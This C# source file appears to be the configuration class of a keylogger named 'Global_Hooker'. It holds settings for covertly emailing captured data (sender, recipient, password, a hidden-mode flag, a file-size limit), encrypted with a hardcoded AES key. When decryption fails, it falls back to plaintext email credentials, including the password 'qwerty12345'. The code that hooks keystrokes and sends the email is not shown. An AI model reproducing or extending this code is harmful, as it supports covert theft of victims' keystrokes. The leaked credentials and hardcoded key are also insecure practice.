using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using GodSharp.Encryption;

namespace Global_Hooker
{
    class ConfigurationManager
    {
        public string EmailAddresser { get; set; }
        public string EmailAddressee { get; set; }
        public string EmailPassword { get; set; }
        public string HiddenMode { get; set; }
        public int MaxFileSize { get; set; }

        private static ConfigurationManager _instace;

        public static ConfigurationManager Instance
        {
            get
            {
                if (_instace == null)
                    _instace = new ConfigurationManager();
                return _instace;
            }
        }

        private ConfigurationManager()
        {
            try
            {
                EmailAddressee = AES.Decrypt(Properties.Settings.Default.EmailAddressee, "dick");
                EmailAddresser = AES.Decrypt(Properties.Settings.Default.EmailAddresser, "dick");
                EmailPassword = AES.Decrypt(Properties.Settings.Default.EmailPassword, "dick");
                HiddenMode = AES.Decrypt(Properties.Settings.Default.HiddenMode, "dick");
                MaxFileSize = int.Parse(AES.Decrypt(Properties.Settings.Default.MaxFileSize, "dick"));
                if (MaxFileSize <= 0)
                {
                    MaxFileSize = 1000;
                }
            }
            catch (Exception ex)
            {
                EmailAddressee = "beckon.rus@gmail.com";
                EmailAddresser = "testerlogger@yandex.ru";
                EmailPassword = "qwerty12345";
                HiddenMode = "False";
                MaxFileSize = 1000;
            }
        }

        public void SaveConfig()
        {
            var settings = Properties.Settings.Default;
            settings.EmailAddressee = AES.Encrypt(EmailAddressee, "dick");
            settings.EmailAddresser = AES.Encrypt(EmailAddresser, "dick");
            settings.EmailPassword = AES.Encrypt(EmailPassword, "dick");
            settings.HiddenMode = AES.Encrypt(HiddenMode, "dick");
            settings.MaxFileSize = AES.Encrypt(MaxFileSize.ToString(), "dick");
            settings.Save();
        }
    }
}
